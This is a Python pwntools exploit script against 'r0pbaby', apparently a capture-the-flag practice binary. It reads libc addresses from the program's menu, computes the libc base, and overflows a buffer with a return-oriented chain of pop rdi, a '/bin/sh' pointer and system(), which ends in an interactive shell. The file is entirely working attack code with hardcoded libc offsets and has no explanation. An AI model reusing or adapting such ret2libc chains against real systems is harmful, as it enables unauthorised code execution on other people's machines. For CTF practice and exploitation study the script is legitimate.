#!/usr/bin/env python
from pwn import *
import string

libc  = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF("./r0pbaby")
conn = process("./r0pbaby")

def get_libc():
	conn.sendlineafter(":","1")
	conn.recvuntil(":")
	libc_base = conn.recvline().strip()
	libc_base = int(libc_base, 16)
	return libc_base
	
def get_func(func_name):
	conn.sendlineafter(":","2")
	conn.sendlineafter(":", func_name)
	conn.recvuntil(":")
	func_addr = conn.recvline().strip()
	func_addr = int(func_addr, 16)
	return func_addr
	
def oneshot_ret(addr, size):
	conn.sendlineafter(":","3")
	conn.sendlineafter(":",size)
	conn.sendline("A"*8+p64(addr))
	
print("")
oneshot_offset = 0x46428

conn.recvuntil("4) Exit")
libc_base = get_libc()

conn.recvuntil("4) Exit")
system_addr = get_func("system")

offset = libc.symbols['system']
libc_base = system_addr-offset

binsh_offset = 0x180543
pop_rdi_offset = 0x125aa7

binsh_addr = libc_base + binsh_offset
pop_rdi_addr = libc_base + pop_rdi_offset

log.info("libc_base    : 0x%x " % libc_base)
log.info("system_addr  : 0x%x " % system_addr)
log.info("binsh_addr   : 0x%x " % binsh_addr)
log.info("pop_rdi_addr : 0x%x " % pop_rdi_addr)

#oneshot_ret(oneshot_addr ,"16")
conn.sendlineafter(":","3")
conn.sendlineafter(":","32")
conn.sendline("A"*8+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr))

conn.interactive()
